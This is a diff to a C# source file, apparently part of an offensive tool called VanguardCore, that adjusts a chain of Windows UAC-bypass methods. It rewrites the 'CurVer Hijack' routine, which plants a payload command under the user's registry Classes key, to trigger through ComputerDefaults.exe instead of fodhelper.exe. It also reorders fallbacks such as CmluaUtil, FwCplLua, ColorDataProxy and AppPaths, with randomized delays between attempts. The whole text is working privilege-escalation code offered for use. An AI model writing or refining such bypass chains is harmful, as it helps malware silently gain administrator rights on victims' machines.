@@ -192,12 +192,12 @@ namespace VanguardCore
             } catch { return false; }
         }
 
-        private static bool BypassCurVer(string payloadPath, string args, string evName, string trigger = "fodhelper.exe")
+        private static bool BypassCurVer(string payloadPath, string args, string evName, string trigger = "ComputerDefaults.exe")
         {
             string randKey = Guid.NewGuid().ToString("N").Substring(0, 8);
             string classKey = $@"Software\Classes\{randKey}";
             try {
-                Log($"Method R: CurVer Hijack ({randKey})...");
+                Log($"Method R: CurVer Hijack via {trigger} ({randKey})...");
                 using (var k = Registry.CurrentUser.CreateSubKey($@"{classKey}\shell\open\command")) {
                     k.SetValue("", $"\"{payloadPath}\" {args}");
                     k.SetValue("DelegateExecute", "");
@@ -369,8 +369,10 @@ namespace VanguardCore
             if (BypassCmluaUtil(payloadPath, args, evName)) return true;
             if (BypassFwCplLua(payloadPath, args)) return true;
             if (BypassMockDir(payloadPath, args, evName)) return true;
-            if (BypassCurVer(payloadPath, args, evName)) return true; // Added professional CurVer bypass
             if (BypassColorDataProxy(payloadPath, args, evName)) return true;
+            
+            // Fallback to CurVer with a safer trigger
+            if (BypassCurVer(payloadPath, args, evName, "ComputerDefaults.exe")) return true;
             
             Thread.Sleep(new Random().Next(3000, 6000));
             if (BypassAppPaths(payloadPath, args, evName, "control.exe")) return true;
